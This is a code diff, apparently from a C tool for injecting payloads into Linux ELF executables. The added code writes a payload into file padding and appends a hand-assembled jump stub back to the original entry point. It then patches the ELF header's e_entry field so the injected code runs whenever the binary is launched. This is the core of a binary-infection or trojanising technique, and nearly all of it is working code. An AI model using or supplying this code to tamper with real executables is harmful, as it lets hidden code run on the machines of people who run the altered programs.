@@ -134,10 +134,36 @@ void write_injection(char *target_path, struct Elf64_Header header,
     f_error("Write injection", "Failed to write payload");
 
   if (verbose)
-    printf("[+] Wrote %u bytes of payload at file offset 0x%lx\n", payload_len,
-           meta.target_padding_offset);
+   fprintf(stderr, "[+] Wrote %u bytes of payload at file offset 0x%lx\n", payload_len, meta.target_padding_offset);
 
-  // ok i need to go back to original herei think
+  
+  unsigned char jmp_stub[12];
+  jmp_stub[0] = 0x48;
+  jmp_stub[1] = 0xb8;
+  memcpy(&jmp_stub[2], &meta.original_entry, 8);
+  jmp_stub[10] = 0xff;
+  jmp_stub[11] = 0xe0;
+
+  if (write(fd, jmp_stub, sizeof(jmp_stub)) != sizeof(jmp_stub))
+    f_error("Write injection", "Failed to write jump-back stub");
+
+  if (verbose)
+    fprintf(stderr, "targets original entry 0x%lx\n",
+           meta.original_entry);
+
+  uint64_t elf_entry_offset = 0x18;
+  if (lseek(fd, elf_entry_offset, SEEK_SET) < 0)
+    f_error("Writing injection", "Failed to seek to e_entry");
+
+  uint64_t new_entry = meta.target_vaddr;
+  if (write(fd, &new_entry, sizeof(new_entry)) != sizeof(new_entry))
+    f_error("Writing injection", "Failed to patch e_entry");
+
+  if (verbose)
+    fprintf(stderr, "Patched e_entry: 0x%lx -> 0x%lx\n", header.e_entry, new_entry);
+
+
+   
 }
 
 int main(int argc, char **argv) {
